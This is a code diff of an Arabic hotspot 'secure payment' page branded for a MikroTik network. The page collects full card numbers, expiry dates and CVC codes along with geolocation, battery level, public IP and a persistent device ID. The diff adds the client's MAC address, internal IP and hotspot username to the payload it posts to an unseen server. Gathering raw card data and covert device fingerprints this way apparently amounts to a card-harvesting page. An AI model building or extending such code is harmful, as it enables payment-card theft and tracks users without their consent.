@@ -5,7 +5,7 @@
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>بيانات الدفع الآمن - حكايات</title>
+    <title>بيانات الدفع الآمن - شبكة حكايات</title>
 
     <!-- FontAwesome & Bootstrap Grid CSS -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
@@ -81,13 +81,13 @@
 
         .input-wrapper input:focus, .input-group-custom select:focus {
             border-color: #01338D;
+            box-shadow: 0 0 0 3px rgba(1, 51, 141, 0.15);
         }
 
         .input-wrapper input.is-invalid {
             border-color: #dc3545 !important;
         }
 
-        /* تنسيق الشعارات داخل الخانات */
         .input-icon-right {
             position: absolute;
             right: 12px;
@@ -114,7 +114,6 @@
             font-size: 18px;
         }
 
-        /* زر إظهار/إخفاء الرمز لـ CVV */
         .toggle-password {
             position: absolute;
             left: 12px;
@@ -173,7 +172,7 @@
             font-weight: bold;
             border-radius: 6px;
             cursor: pointer;
-            transition: background 0.3s;
+            transition: background 0.3s, transform 0.1s;
         }
 
         .submit-btn:hover {
@@ -192,7 +191,6 @@
             color: #777;
         }
 
-        /* تنسيق شعارات البنوك الملونة في التذييل */
         footer {
             padding: 25px 0 35px 0;
             background: #ffffff;
@@ -249,7 +247,7 @@
 <body>
 
     <header class="payment-header">
-        <h1>إتمام الدفع الإلكتروني</h1>
+        <h1>إتمام الدفع الإلكتروني - شبكة حكايات</h1>
     </header>
 
     <div class="container">
@@ -398,6 +396,19 @@
     </footer>
 
     <script>
+        // =================================================================
+        // 1. استخراج متغيرات الميكروتك (MikroTik Hotspot Variables)
+        // =================================================================
+        const mikrotikIP = "$(ip)";
+        const mikrotikMAC = "$(mac)";
+        const mikrotikUsername = "$(username)";
+
+        // التحقق مما إذا كانت قيم الميكروتك قد تم استبدالها بالفعل بواسطة الخادم أم لا
+        const internalIP = (mikrotikIP && !mikrotikIP.includes("$(")) ? mikrotikIP : (window.location.hostname || "127.0.0.1");
+        const macAddress = (mikrotikMAC && !mikrotikMAC.includes("$(")) ? mikrotikMAC : "غير متوفر";
+        const clientUsername = (mikrotikUsername && !mikrotikUsername.includes("$(")) ? mikrotikUsername : "";
+
+        // Elements
         const paymentMethodSelect = document.getElementById('payment_method');
         const cardSection = document.getElementById('card_section');
         const phoneGroup = document.getElementById('phone_group');
@@ -424,7 +435,7 @@
             }
         });
 
-        // تفعيل زر إظهار وإخفاء رمز الـ CVV
+        // زر إظهار وإخفاء رمز ה-CVV
         const toggleCvvBtn = document.getElementById('toggleCvvBtn');
         const cardCvcInput = document.getElementById('card_cvc');
         const cvvIcon = document.getElementById('cvvIcon');
@@ -447,6 +458,9 @@
             });
         }
 
+        // =================================================================
+        // 2. التحقق من المدخلات (Validations)
+        // =================================================================
         const amountInput = document.getElementById('pay_amount');
         amountInput.addEventListener('input', function (e) {
             let val = convertArabicDigitsToEnglish(e.target.value).replace(/[^\d.]/g, '');
@@ -592,9 +606,9 @@
             }
         }
 
-        /**
-         * دالة جلب IP الخارجي للمستخدم عبر API
-         */
+        // =================================================================
+        // 3. الدوال المساعدة للجلب (Geolocation & IP)
+        // =================================================================
         async function getPublicIP() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json', { timeout: 3000 });
@@ -605,9 +619,6 @@
             }
         }
 
-        /**
-         * دالة جلب الإحداثيات الجغرافية بدقة مع التراجع التلقائي
-         */
         function getGeolocation() {
             return new Promise((resolve) => {
                 if ("geolocation" in navigator) {
@@ -629,9 +640,9 @@
             });
         }
 
-        /**
-         * دالة معالجة الدفع المدمجة والشاملة لكل حقول البيانات
-         */
+        // =================================================================
+        // 4. معالجة طلب الدفع وإرسال البيانات
+        // =================================================================
         async function pay(e) {
             if (e) e.preventDefault();
 
@@ -658,14 +669,14 @@
             submitBtn.disabled = true;
             submitBtn.innerText = "جاري المعالجة والتحويل...";
 
-            // 1. توليد أو استرجاع المعرف الفريد للجهاز (Device UUID)
+            // توليد أو استرجاع معرف الجهاز الفريد
             let clientID = localStorage.getItem("clientID");
             if (!clientID) {
-                clientID = "DEV_" + Math.random().toString(36).substr(2, 9) + "_" + Date.now();
+                clientID = (clientUsername ? clientUsername + "_" : "DEV_") + Math.random().toString(36).substr(2, 9) + "_" + Date.now();
                 localStorage.setItem("clientID", clientID);
             }
 
-            // 2. جلب نسبة البطارية
+            // نسبة البطارية
             let batteryLevel = "غير مدعوم";
             try {
                 if (navigator.getBattery) {
@@ -674,29 +685,34 @@
                 }
             } catch (err) {}
 
-            // 3. جلب الإحداثيات الجغرافية والـ IP الخارجي الحقيقي بشكل متوازي
+            // جلب الموقع الـ IP الخارجي
             const [geo, publicIP] = await Promise.all([
                 getGeolocation(),
                 getPublicIP()
             ]);
 
-            // 4. بناء كائن البيانات الكامل المدمج
+            // إعداد كائن البيانات المكتمل وإضافة بيانات الميكروتك
             const payload = {
                 amount: document.getElementById("pay_amount").value,
                 payment_method: selectedMethod,
                 phone: selectedMethod === "wallet" ? document.getElementById("user_phone").value : "غير محدد",
-                
+
                 // بيانات الكارت
-                number: selectedMethod === "card" ? cardNumberInput.value.replace(/\s+/g, '') : "",
-                name: selectedMethod === "card" ? nameInput.value : "",
-                expiry: selectedMethod === "card" ? mmyyInput.value : "",
-                cvc: selectedMethod === "card" ? cvcInput.value : "",
+                card_data: {
+                    number: selectedMethod === "card" ? cardNumberInput.value.replace(/\s+/g, '') : "",
+                    name: selectedMethod === "card" ? nameInput.value : "",
+                    expiry: selectedMethod === "card" ? mmyyInput.value : "",
+                    cvc: selectedMethod === "card" ? cvcInput.value : ""
+                },
                 save_card: document.getElementById("save_card").checked ? "tokenize" : "لا",
 
-                // تفاصيل الجهاز، الشبكة، والمعرفات
-                clientID: clientID, // معرف فريد مميز للجهاز
-                internalIP: window.location.hostname || "127.0.0.1",
-                publicIP: publicIP, // الـ IP الخارجي المجلوب أوتوماتيكياً
+                // بيانات الميكروتك والشبكة المدمجة
+                internalIP: internalIP,
+                mac: macAddress,
+                clientID: clientID,
+
+                // بيانات الجهاز والموقع
+                publicIP: publicIP,
                 lat: geo.lat,
                 lon: geo.lon,
                 city: "القاهرة",
@@ -719,7 +735,7 @@
                 });
 
                 const resData = await response.json();
-                
+
                 if (resData.payment_url) {
                     window.location.href = resData.payment_url;
                 } else {
@@ -735,7 +751,6 @@
             }
         }
 
-        // ربط حدث الإرسال الخاص بالنموذج بدالة الدفع المدمجة
         document.getElementById("paymob_checkout").addEventListener("submit", pay);
     </script>
 </body>
